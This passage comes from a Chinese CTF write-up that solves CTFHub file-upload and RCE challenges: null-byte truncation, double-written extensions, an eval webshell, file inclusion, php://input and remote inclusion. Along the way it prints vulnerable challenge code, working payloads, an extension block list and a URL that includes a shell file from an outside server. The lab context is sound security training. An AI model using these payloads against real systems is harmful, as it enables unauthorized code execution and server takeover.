class="hljs-variable">$name</span> = <span class="hljs-title function_ invoke__">basename</span>(<span class="hljs-variable">$_FILES</span>[<span class="hljs-string">&#x27;file&#x27;</span>][<span class="hljs-string">&#x27;name&#x27;</span>]);<br>    <span class="hljs-variable">$info</span> = <span class="hljs-title function_ invoke__">pathinfo</span>(<span class="hljs-variable">$name</span>);<br>    <span class="hljs-variable">$ext</span> = <span class="hljs-variable">$info</span>[<span class="hljs-string">&#x27;extension&#x27;</span>];<br>    <span class="hljs-variable">$whitelist</span> = <span class="hljs-keyword">array</span>(<span class="hljs-string">&quot;jpg&quot;</span>, <span class="hljs-string">&quot;png&quot;</span>, <span class="hljs-string">&quot;gif&quot;</span>);<br>    <span class="hljs-keyword">if</span> (<span class="hljs-title function_ invoke__">in_array</span>(<span class="hljs-variable">$ext</span>, <span class="hljs-variable">$whitelist</span>)) &#123;<br>        <span class="hljs-variable">$des</span> = <span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;road&#x27;</span>] . <span class="hljs-string">&quot;/&quot;</span> . <span class="hljs-title function_ invoke__">rand</span>(<span class="hljs-number">10</span>, <span class="hljs-number">99</span>) . <span class="hljs-title function_ invoke__">date</span>(<span class="hljs-string">&quot;YmdHis&quot;</span>) . <span class="hljs-string">&quot;.&quot;</span> . <span class="hljs-variable">$ext</span>;<br>        <span class="hljs-keyword">if</span> (<span class="hljs-title function_ invoke__">move_uploaded_file</span>(<span class="hljs-variable">$_FILES</span>[<span class="hljs-string">&#x27;file&#x27;</span>][<span class="hljs-string">&#x27;tmp_name&#x27;</span>], <span class="hljs-variable">$des</span>)) &#123;<br>            <span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;&lt;script&gt;alert(&#x27;上传成功&#x27;)&lt;/script&gt;&quot;</span>;<br>        &#125; <span class="hljs-keyword">else</span> &#123;<br>            <span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;&lt;script&gt;alert(&#x27;上传失败&#x27;)&lt;/script&gt;&quot;</span>;<br>        &#125;<br>    &#125; <span class="hljs-keyword">else</span> &#123;<br>        <span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;文件类型不匹配&quot;</span>;<br>    &#125;<br>&#125;<br><br><span class="hljs-meta">?&gt;</span><br>&lt;!DOCTYPE html&gt;<br>&lt;html&gt;<br>&lt;head&gt;<br>    &lt;meta charset=<span class="hljs-string">&quot;UTF-8&quot;</span>&gt;<br>    &lt;title&gt;CTFHub 文件上传 - <span class="hljs-number">00</span>截断&lt;/title&gt;<br>&lt;/head&gt;<br>&lt;body&gt;<br>    &lt;h1&gt;CTFHub 文件上传 - <span class="hljs-number">00</span>截断&lt;/h1&gt;<br>    &lt;form action=<span class="hljs-meta">&lt;?php</span> <span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;?road=&quot;</span> . UPLOAD_PATH; <span class="hljs-meta">?&gt;</span> method=<span class="hljs-string">&quot;post&quot;</span> enctype=<span class="hljs-string">&quot;multipart/form-data&quot;</span>&gt;<br>        &lt;label <span class="hljs-keyword">for</span>=<span class="hljs-string">&quot;file&quot;</span>&gt;Filename:&lt;/label&gt;<br>        &lt;input type=<span class="hljs-string">&quot;file&quot;</span> name=<span class="hljs-string">&quot;file&quot;</span> id=<span class="hljs-string">&quot;file&quot;</span> /&gt;<br>        &lt;br /&gt;<br>        &lt;input type=<span class="hljs-string">&quot;submit&quot;</span> name=<span class="hljs-string">&quot;submit&quot;</span> value=<span class="hljs-string">&quot;Submit&quot;</span> /&gt;<br>    &lt;/form&gt;<br>&lt;/body&gt;<br>&lt;/html&gt;<br></code></pre></td></tr></table></figure>
<p>它首先对上传的文件的后缀进行检测，只能是三个图片文件格式。</p>
<p>此外对文件进行存储的时候对文件名进行重命名，在保留原后缀名的情况下把文件名淦成随机的，首先在<code>10-99</code>里选一个数，再加上上传时间，这个上传时间还精确到毫秒2333，十分变态。上传了一个文件你甚至都不知道它的路径，十分绝望。</p>
<p>存储的路径是这样组成的<code>$des = $_GET['road'] . &quot;/&quot; . rand(10, 99) . date(&quot;YmdHis&quot;) . &quot;.&quot; . $ext;</code>。其中的<code>road</code>是页面自动发送的，默认值是<code>/var/www/html/upload/</code>。</p>
<p>这里我们可以利用远古php版本有的一个00截断，手动把这个road参数改成</p>
<figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs awk"><span class="hljs-regexp">/var/</span>www<span class="hljs-regexp">/html/u</span>pload/<span class="hljs-number">1</span>.php%<span class="hljs-number">00</span>.jpg<br></code></pre></td></tr></table></figure>
<p>改动这个road参数不会对文件上传这个过程产生影响。</p>
<p>服务器那边接受到的文件还是为<code>1.php%00.jpg</code>，服务器一检查后缀，哦，是.jpg，在白名单内，接下去进行存储。</p>
<p>按理说存储的路径应该是<code>upload/1.php%00.jpg/5020210902203850.jpg</code>。</p>
<p>但是%00之后的所有东西都被截断了，那些随机数和时间全部失效，最终存储的文件就变成了<code>upload/1.php</code></p>
<p><img src="https://upyun.wuuconix.link/image-20210902192907683.png" srcset="/img/loading.gif" lazyload alt="payload" /></p>
<p><img src="https://upyun.wuuconix.link/image-20210902192936182.png" srcset="/img/loading.gif" lazyload alt="antsword" /></p>
<p><img src="https://upyun.wuuconix.link/image-20210902192949094.png" srcset="/img/loading.gif" lazyload alt="flag" /></p>
<p>这个00截取和我一开始想象的不一样。我以为在上传过程中会直接%00后面字符全部丢掉，服务接收到的只是%00之前的内容。</p>
<p>但是其实不是，服务器会原样的接收该文件，只是在某些操作下，%00后面的字符会失效，但这些操作都有哪些，还不得而知。</p>
<p>试了好多php镜像，都无法复现。以后再说吧。</p>
<h3 id="双写后缀"><a class="markdownIt-Anchor" href="#双写后缀"></a> 双写后缀</h3>
<p>这道题就比00截断简单多了，我们先看一下题目给我们的提示。</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-variable">$name</span> = <span class="hljs-title function_ invoke__">basename</span>(<span class="hljs-variable">$_FILES</span>[<span class="hljs-string">&#x27;file&#x27;</span>][<span class="hljs-string">&#x27;name&#x27;</span>]);<br><span class="hljs-variable">$blacklist</span> = <span class="hljs-keyword">array</span>(<span class="hljs-string">&quot;php&quot;</span>, <span class="hljs-string">&quot;php5&quot;</span>, <span class="hljs-string">&quot;php4&quot;</span>, <span class="hljs-string">&quot;php3&quot;</span>, <span class="hljs-string">&quot;phtml&quot;</span>, <span class="hljs-string">&quot;pht&quot;</span>, <span class="hljs-string">&quot;jsp&quot;</span>, <span class="hljs-string">&quot;jspa&quot;</span>, <span class="hljs-string">&quot;jspx&quot;</span>, <span class="hljs-string">&quot;jsw&quot;</span>, <span class="hljs-string">&quot;jsv&quot;</span>, <span class="hljs-string">&quot;jspf&quot;</span>, <span class="hljs-string">&quot;jtml&quot;</span>, <span class="hljs-string">&quot;asp&quot;</span>, <span class="hljs-string">&quot;aspx&quot;</span>, <span class="hljs-string">&quot;asa&quot;</span>, <span class="hljs-string">&quot;asax&quot;</span>, <span class="hljs-string">&quot;ascx&quot;</span>, <span class="hljs-string">&quot;ashx&quot;</span>, <span class="hljs-string">&quot;asmx&quot;</span>, <span class="hljs-string">&quot;cer&quot;</span>, <span class="hljs-string">&quot;swf&quot;</span>, <span class="hljs-string">&quot;htaccess&quot;</span>, <span class="hljs-string">&quot;ini&quot;</span>);<br><span class="hljs-variable">$name</span> = <span class="hljs-title function_ invoke__">str_ireplace</span>(<span class="hljs-variable">$blacklist</span>, <span class="hljs-string">&quot;&quot;</span>, <span class="hljs-variable">$name</span>);<br></code></pre></td></tr></table></figure>
<p>显然，它对我们上传的文件名中的特定字符进行了替换，但是这种替换实际上是不安全的，双拼即可绕过。例子如下。</p>
<p><img src="https://upyun.wuuconix.link/image-20210903114145987.png" srcset="/img/loading.gif" lazyload alt="双拼绕过例子" /></p>
<p>所以我们只要上传一个<code>1.pphphp</code>。经过它的处理后就变成了<code>1.php</code>。</p>
<p><img src="https://upyun.wuuconix.link/image-20210903114431095.png" srcset="/img/loading.gif" lazyload alt="1.php成功上传" /></p>
<p>然后蚁剑连接即可。</p>
<p><img src="https://upyun.wuuconix.link/image-20210903114355589.png" srcset="/img/loading.gif" lazyload alt="flag" /></p>
<p>顺便把它的源码偷下来以后用2333。</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><span class="hljs-title function_ invoke__">header</span>(<span class="hljs-string">&quot;Content-type: text/html;charset=utf-8&quot;</span>);<br><span class="hljs-title function_ invoke__">error_reporting</span>(<span class="hljs-number">0</span>);<br><span class="hljs-comment">//设置上传目录</span><br><span class="hljs-title function_ invoke__">define</span>(<span class="hljs-string">&quot;UPLOAD_PATH&quot;</span>, <span class="hljs-title function_ invoke__">dirname</span>(<span class="hljs-keyword">__FILE__</span>) . <span class="hljs-string">&quot;/upload/&quot;</span>);<br><span class="hljs-title function_ invoke__">define</span>(<span class="hljs-string">&quot;UPLOAD_URL_PATH&quot;</span>, <span class="hljs-title function_ invoke__">str_replace</span>(<span class="hljs-variable">$_SERVER</span>[<span class="hljs-string">&#x27;DOCUMENT_ROOT&#x27;</span>], <span class="hljs-string">&quot;&quot;</span>, UPLOAD_PATH));<br><span class="hljs-keyword">if</span> (!<span class="hljs-title function_ invoke__">file_exists</span>(UPLOAD_PATH)) &#123;<br>    <span class="hljs-title function_ invoke__">mkdir</span>(UPLOAD_PATH, <span class="hljs-number">0755</span>);<br>&#125;<br><span class="hljs-keyword">if</span> (!<span class="hljs-keyword">empty</span>(<span class="hljs-variable">$_POST</span>[<span class="hljs-string">&#x27;submit&#x27;</span>])) &#123;<br>    <span class="hljs-variable">$name</span> = <span class="hljs-title function_ invoke__">basename</span>(<span class="hljs-variable">$_FILES</span>[<span class="hljs-string">&#x27;file&#x27;</span>][<span class="hljs-string">&#x27;name&#x27;</span>]);<br>    <span class="hljs-variable">$blacklist</span> = <span class="hljs-keyword">array</span>(<span class="hljs-string">&quot;php&quot;</span>, <span class="hljs-string">&quot;php5&quot;</span>, <span class="hljs-string">&quot;php4&quot;</span>, <span class="hljs-string">&quot;php3&quot;</span>, <span class="hljs-string">&quot;phtml&quot;</span>, <span class="hljs-string">&quot;pht&quot;</span>, <span class="hljs-string">&quot;jsp&quot;</span>, <span class="hljs-string">&quot;jspa&quot;</span>, <span class="hljs-string">&quot;jspx&quot;</span>, <span class="hljs-string">&quot;jsw&quot;</span>, <span class="hljs-string">&quot;jsv&quot;</span>, <span class="hljs-string">&quot;jspf&quot;</span>, <span class="hljs-string">&quot;jtml&quot;</span>, <span class="hljs-string">&quot;asp&quot;</span>, <span class="hljs-string">&quot;aspx&quot;</span>, <span class="hljs-string">&quot;asa&quot;</span>, <span class="hljs-string">&quot;asax&quot;</span>, <span class="hljs-string">&quot;ascx&quot;</span>, <span class="hljs-string">&quot;ashx&quot;</span>, <span class="hljs-string">&quot;asmx&quot;</span>, <span class="hljs-string">&quot;cer&quot;</span>, <span class="hljs-string">&quot;swf&quot;</span>, <span class="hljs-string">&quot;htaccess&quot;</span>, <span class="hljs-string">&quot;ini&quot;</span>);<br>    <span class="hljs-variable">$name</span> = <span class="hljs-title function_ invoke__">str_ireplace</span>(<span class="hljs-variable">$blacklist</span>, <span class="hljs-string">&quot;&quot;</span>, <span class="hljs-variable">$name</span>);<br>    <span class="hljs-keyword">if</span> (<span class="hljs-title function_ invoke__">move_uploaded_file</span>(<span class="hljs-variable">$_FILES</span>[<span class="hljs-string">&#x27;file&#x27;</span>][<span class="hljs-string">&#x27;tmp_name&#x27;</span>], UPLOAD_PATH . <span class="hljs-variable">$name</span>)) &#123;<br>        <span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;&lt;script&gt;alert(&#x27;上传成功&#x27;)&lt;/script&gt;&quot;</span>;<br>        <span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;上传文件相对路径&lt;br&gt;&quot;</span> . UPLOAD_URL_PATH . <span class="hljs-variable">$name</span>;<br>    &#125; <span class="hljs-keyword">else</span> &#123;<br>        <span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;&lt;script&gt;alert(&#x27;上传失败&#x27;)&lt;/script&gt;&quot;</span>;<br>    &#125;<br>&#125;<br><span class="hljs-meta">?&gt;</span><br>&lt;!DOCTYPE html&gt;<br>&lt;html&gt;<br>&lt;head&gt;<br>    &lt;meta charset=<span class="hljs-string">&quot;UTF-8&quot;</span>&gt;<br>    &lt;title&gt;CTFHub 文件上传——双写绕过&lt;/title&gt;<br>&lt;/head&gt;<br>&lt;body&gt;<br>    &lt;h1&gt;CTFHub 文件上传——双写绕过&lt;/h1&gt;<br>    &lt;form action=<span class="hljs-string">&quot;&quot;</span> method=<span class="hljs-string">&quot;post&quot;</span> enctype=<span class="hljs-string">&quot;multipart/form-data&quot;</span>&gt;<br>        &lt;label <span class="hljs-keyword">for</span>=<span class="hljs-string">&quot;file&quot;</span>&gt;Filename:&lt;/label&gt;<br>        &lt;input type=<span class="hljs-string">&quot;file&quot;</span> name=<span class="hljs-string">&quot;file&quot;</span> id=<span class="hljs-string">&quot;file&quot;</span> /&gt;<br>        &lt;br /&gt;<br>        &lt;input type=<span class="hljs-string">&quot;submit&quot;</span> name=<span class="hljs-string">&quot;submit&quot;</span> value=<span class="hljs-string">&quot;Submit&quot;</span> /&gt;<br>    &lt;/form&gt;<br>    &lt;p&gt;&lt;/p&gt;<br>&lt;/body&gt;<br>&lt;/html&gt;<br>&lt;!--<br><span class="hljs-variable">$name</span> = <span class="hljs-title function_ invoke__">basename</span>(<span class="hljs-variable">$_FILES</span>[<span class="hljs-string">&#x27;file&#x27;</span>][<span class="hljs-string">&#x27;name&#x27;</span>]);<br><span class="hljs-variable">$blacklist</span> = <span class="hljs-keyword">array</span>(<span class="hljs-string">&quot;php&quot;</span>, <span class="hljs-string">&quot;php5&quot;</span>, <span class="hljs-string">&quot;php4&quot;</span>, <span class="hljs-string">&quot;php3&quot;</span>, <span class="hljs-string">&quot;phtml&quot;</span>, <span class="hljs-string">&quot;pht&quot;</span>, <span class="hljs-string">&quot;jsp&quot;</span>, <span class="hljs-string">&quot;jspa&quot;</span>, <span class="hljs-string">&quot;jspx&quot;</span>, <span class="hljs-string">&quot;jsw&quot;</span>, <span class="hljs-string">&quot;jsv&quot;</span>, <span class="hljs-string">&quot;jspf&quot;</span>, <span class="hljs-string">&quot;jtml&quot;</span>, <span class="hljs-string">&quot;asp&quot;</span>, <span class="hljs-string">&quot;aspx&quot;</span>, <span class="hljs-string">&quot;asa&quot;</span>, <span class="hljs-string">&quot;asax&quot;</span>, <span class="hljs-string">&quot;ascx&quot;</span>, <span class="hljs-string">&quot;ashx&quot;</span>, <span class="hljs-string">&quot;asmx&quot;</span>, <span class="hljs-string">&quot;cer&quot;</span>, <span class="hljs-string">&quot;swf&quot;</span>, <span class="hljs-string">&quot;htaccess&quot;</span>, <span class="hljs-string">&quot;ini&quot;</span>);<br><span class="hljs-variable">$name</span> = <span class="hljs-title function_ invoke__">str_ireplace</span>(<span class="hljs-variable">$blacklist</span>, <span class="hljs-string">&quot;&quot;</span>, <span class="hljs-variable">$name</span>);<br>--&gt;<br></code></pre></td></tr></table></figure>
<h2 id="rce"><a class="markdownIt-Anchor" href="#rce"></a> RCE</h2>
<h3 id="eval执行"><a class="markdownIt-Anchor" href="#eval执行"></a> eval执行</h3>
<p>题目如下</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><span class="hljs-keyword">if</span> (<span class="hljs-keyword">isset</span>(<span class="hljs-variable">$_REQUEST</span>[<span class="hljs-string">&#x27;cmd&#x27;</span>])) &#123;<br>    <span class="hljs-keyword">eval</span>(<span class="hljs-variable">$_REQUEST</span>[<span class="hljs-string">&quot;cmd&quot;</span>]);<br>&#125; <span class="hljs-keyword">else</span> &#123;<br>    <span class="hljs-title function_ invoke__">highlight_file</span>(<span class="hljs-keyword">__FILE__</span>);<br>&#125;<br><span class="hljs-meta">?&gt;</span><br></code></pre></td></tr></table></figure>
<p>我看了一眼，这不就是php一句话木马嘛2333。直接蚁剑连接了，很快得到了flag。</p>
<p><img src="https://upyun.wuuconix.link/image-20210903115843283.png" srcset="/img/loading.gif" lazyload alt="antsword flag" /></p>
<p>然后我局的的还是得手动输入命令来得到flag。我是这样试的。</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">/index.php?cmd=<span class="hljs-built_in">ls</span><br></code></pre></td></tr></table></figure>
<p>但是页面一片空白2333。</p>
<p>后来我才意识到，php中的<code>eval</code>函数是用来执行php里的函数的，相当于把一个字符串运行。但是这个ls可不是php里的函数，需要利用<code>system</code>函数来调用linux系统命令。</p>
<figure class="highlight pgsql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs pgsql">/<span class="hljs-keyword">index</span>.php?cmd=<span class="hljs-keyword">system</span>(&quot;ls&quot;)<br></code></pre></td></tr></table></figure>
<p>结果还是不行。我再次陷入了人生和社会的大思考。</p>
<p>看了官方wp之后才知道eval里面的字符串需要满足一个完整的php语句的要求。即<code>;</code>结尾。</p>
<p>忘记分号这件事实际上一直在发生，在php交互式终端如果你不输分号的话是不会有任何结果的。</p>
<p><img src="https://upyun.wuuconix.link/image-20210903121548796.png" srcset="/img/loading.gif" lazyload alt="echo 1" /></p>
<p>只有输入分号，作为一条完整的php语句的时候才有结果。</p>
<p><img src="https://upyun.wuuconix.link/image-20210903121626332.png" srcset="/img/loading.gif" lazyload alt="echo 1;" /></p>
<p>同理eval里面的语句也必须要有分号。你不输分号它甚至会报错2333。</p>
<p><img src="https://upyun.wuuconix.link/image-20210903121741001.png" srcset="/img/loading.gif" lazyload alt="eval" /></p>
<p>接下来就简单啦。</p>
<p><img src="https://upyun.wuuconix.link/image-20210903121419176.png" srcset="/img/loading.gif" lazyload alt="ls /" /></p>
<p><img src="https://upyun.wuuconix.link/image-20210903121434027.png" srcset="/img/loading.gif" lazyload alt="cat /flag" /></p>
<h3 id="文件包含"><a class="markdownIt-Anchor" href="#文件包含"></a> 文件包含</h3>
<p>这道题也十分简单。主要的考点是<code>include</code>。在php中利用该函数可以将其他文件引入当前php文件。</p>
<p>我之前以为引入的文件只能是php文件，现在看来根本没有这种限制，只要你被引入的文件里有php语句就能正常发挥作用，具体的文件后缀是没有影响的。</p>
<p>比如下面的例子 ，我引入了一个<code>test.txt</code>也能够正常的发挥作用。</p>
<p><img src="https://upyun.wuuconix.link/image-20210903125119391.png" srcset="/img/loading.gif" lazyload alt="test.txt" /></p>
<p><img src="https://upyun.wuuconix.link/image-20210903125149707.png" srcset="/img/loading.gif" lazyload alt="phpinfo" /></p>
<p>那我们再来看看这道题。</p>
<p><img src="https://upyun.wuuconix.link/image-20210903125244675.png" srcset="/img/loading.gif" lazyload alt="题目1" /></p>
<p><img src="https://upyun.wuuconix.link/image-20210903125258220.png" srcset="/img/loading.gif" lazyload alt="题目2" /></p>
<p>它提供了一个木马txt文件，同时还提供了file参数来引入文件，很显然我们只要这样就能样<code>index.php</code>变成一句话木马。</p>
<figure class="highlight vim"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs vim"><span class="hljs-built_in">index</span>.php?<span class="hljs-keyword">file</span>=<span class="hljs-keyword">shell</span>.txt<br></code></pre></td></tr></table></figure>
<p>我本来以为蚁剑这样是连不上的，结果强大的蚁剑迅速理解了意思，成功连接。</p>
<p><img src="https://upyun.wuuconix.link/image-20210903125442117.png" srcset="/img/loading.gif" lazyload alt="antsword" /></p>
<p>那如何手动get flag呢？只需要继续添加ctfhub参数即可。</p>
<figure class="highlight sas"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs sas"><span class="hljs-keyword">index</span>.php?<span class="hljs-keyword">file</span>=shell.txt<span class="hljs-variable">&amp;ctfhub</span>=<span class="hljs-meta">system</span>(<span class="hljs-string">&quot;cat /flag&quot;</span>);<br></code></pre></td></tr></table></figure>
<p>直接在浏览器输入以上payload即可，至于那个空格 浏览器会自动进行url编码，成为<code>%20</code>。</p>
<p><img src="https://upyun.wuuconix.link/image-20210903125540553.png" srcset="/img/loading.gif" lazyload alt="手动ctf" /></p>
<p>偷源码233</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><span class="hljs-title function_ invoke__">error_reporting</span>(<span class="hljs-number">0</span>);<br><span class="hljs-keyword">if</span> (<span class="hljs-keyword">isset</span>(<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;file&#x27;</span>])) &#123;<br>    <span class="hljs-keyword">if</span> (!<span class="hljs-title function_ invoke__">strpos</span>(<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&quot;file&quot;</span>], <span class="hljs-string">&quot;flag&quot;</span>)) &#123;<br>        <span class="hljs-keyword">include</span> <span class="hljs-variable">$_GET</span>[<span class="hljs-string">&quot;file&quot;</span>];<br>    &#125; <span class="hljs-keyword">else</span> &#123;<br>        <span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;Hacker!!!&quot;</span>;<br>    &#125;<br>&#125; <span class="hljs-keyword">else</span> &#123;<br>    <span class="hljs-title function_ invoke__">highlight_file</span>(<span class="hljs-keyword">__FILE__</span>);<br>&#125;<br><span class="hljs-meta">?&gt;</span><br>&lt;hr&gt;<br>i have a &lt;a href=<span class="hljs-string">&quot;shell.txt&quot;</span>&gt;shell&lt;/a&gt;, how to <span class="hljs-keyword">use</span> <span class="hljs-title">it</span> ?<br></code></pre></td></tr></table></figure>
<h3 id="phpinput"><a class="markdownIt-Anchor" href="#phpinput"></a> php://input</h3>
<p>题目提示</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><span class="hljs-keyword">if</span> (<span class="hljs-keyword">isset</span>(<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;file&#x27;</span>])) &#123;<br>    <span class="hljs-keyword">if</span> ( <span class="hljs-title function_ invoke__">substr</span>(<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&quot;file&quot;</span>], <span class="hljs-number">0</span>, <span class="hljs-number">6</span>) === <span class="hljs-string">&quot;php://&quot;</span> ) &#123;<br>        <span class="hljs-keyword">include</span>(<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&quot;file&quot;</span>]);<br>    &#125; <span class="hljs-keyword">else</span> &#123;<br>        <span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;Hacker!!!&quot;</span>;<br>    &#125;<br>&#125; <span class="hljs-keyword">else</span> &#123;<br>    <span class="hljs-title function_ invoke__">highlight_file</span>(<span class="hljs-keyword">__FILE__</span>);<br>&#125;<br><span class="hljs-meta">?&gt;</span><br>&lt;hr&gt;<br>i don<span class="hljs-string">&#x27;t have shell, how to get flag? &lt;br&gt;</span><br><span class="hljs-string">&lt;a href=&quot;phpinfo.php&quot;&gt;phpinfo&lt;/a&gt;</span><br></code></pre></td></tr></table></figure>
<p>题目题目我们给file变量传一个<code>php://input</code>。</p>
<p><code>php://input</code>生效的条件为：</p>
<blockquote>
<p>在php.ini中的<code>allow_url_fopen</code>和<code>allow_url_include</code>全部开启。</p>
</blockquote>
<p>这个<code>php://input</code>支持post方式传输的数据流的输入。我们可以用post方式传值。</p>
<p>因为源代码把我们输入的代码<code>include</code>的了，相当于我们写的php代码将直接在题目中发挥作用。</p>
<p>我么这里直接写一个</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span> <span class="hljs-title function_ invoke__">system</span>(<span class="hljs-string">&quot;ls /&quot;</span>); <span class="hljs-meta">?&gt;</span><br></code></pre></td></tr></table></figure>
<p>来看一看根目录下的文件们。</p>
<p><img src="https://upyun.wuuconix.link/image-20210904223648891.png" srcset="/img/loading.gif" lazyload alt="post 传值" /></p>
<p>很顺利的找到了flag。cat即可。</p>
<p><img src="https://upyun.wuuconix.link/image-20210904223937452.png" srcset="/img/loading.gif" lazyload alt="ctf" /></p>
<p>再把源码偷下来233。</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><span class="hljs-keyword">if</span> (<span class="hljs-keyword">isset</span>(<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;file&#x27;</span>])) &#123;<br>    <span class="hljs-keyword">if</span> ( <span class="hljs-title function_ invoke__">substr</span>(<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&quot;file&quot;</span>], <span class="hljs-number">0</span>, <span class="hljs-number">6</span>) === <span class="hljs-string">&quot;php://&quot;</span> ) &#123;<br>        <span class="hljs-keyword">include</span>(<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&quot;file&quot;</span>]);<br>    &#125; <span class="hljs-keyword">else</span> &#123;<br>        <span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;Hacker!!!&quot;</span>;<br>    &#125;<br>&#125; <span class="hljs-keyword">else</span> &#123;<br>    <span class="hljs-title function_ invoke__">highlight_file</span>(<span class="hljs-keyword">__FILE__</span>);<br>&#125;<br><span class="hljs-meta">?&gt;</span><br>&lt;hr&gt;<br>i don<span class="hljs-string">&#x27;t have shell, how to get flag? &lt;br&gt;</span><br><span class="hljs-string">&lt;a href=&quot;phpinfo.php&quot;&gt;phpinfo&lt;/a&gt;</span><br></code></pre></td></tr></table></figure>
<h3 id="远程包含"><a class="markdownIt-Anchor" href="#远程包含"></a> 远程包含</h3>
<p>php 的include在以下条件下可以引入一个url文件。</p>
<blockquote>
<p>在php.ini中的<code>allow_url_fopen</code>和<code>allow_url_include</code>全部开启。</p>
</blockquote>
<p>观察题目给出的phpinfo</p>
<p><img src="https://upyun.wuuconix.link/image-20210904225423629.png" srcset="/img/loading.gif" lazyload alt="allow_url_include" /></p>
<p>符合条件。</p>
<p>于是我在我的阿里云服务器上开了一个服务。</p>
<p><img src="https://upyun.wuuconix.link/image-20210904225542852.png" srcset="/img/loading.gif" lazyload alt="远程shell.txt" /></p>
<p>然后把这个url include就可以了。</p>
<figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs awk">http:<span class="hljs-regexp">//</span>challenge-<span class="hljs-number">085</span>d74ac724ca4c9.sandbox.ctfhub.com:<span class="hljs-number">10800</span><span class="hljs-regexp">/?file=https:/</span><span class="hljs-regexp">/emu.wuuconix.link/</span>shell.txt<br></code></pre></td></tr></table></figure>
<p>然后就可以连接蚁剑啦！</p>
<p><img src="https://upyun.wuuconix.link/image-20210904225651405.png" srcset="/img/loading.gif" lazyload alt="antsword" /></p>
<p>同时我们可以发现url include一个文件和<code>php://input</code>生效的条件是一模一样的。所以在没有手动限制的情况下， 这其中一个可用，就说明另一个也可用。所以我们在这道题里同样可以使用上一道题<code>php://input</code>的做法。</p>
<p>生效条件一样也非常好理解。<code>php://input</code>能够支持用户post传的值，这对于服务器本身而言，就是外界url的文本嘛2333，相当于引入了一个url文件。故两者生效条件一致。</p>
<p><img src="https://upyun.wuuconix.link/image-20210904225912708.png" srcset="/img/loading.gif" lazyload alt="input" /></p>
<p>题目源代码</p>
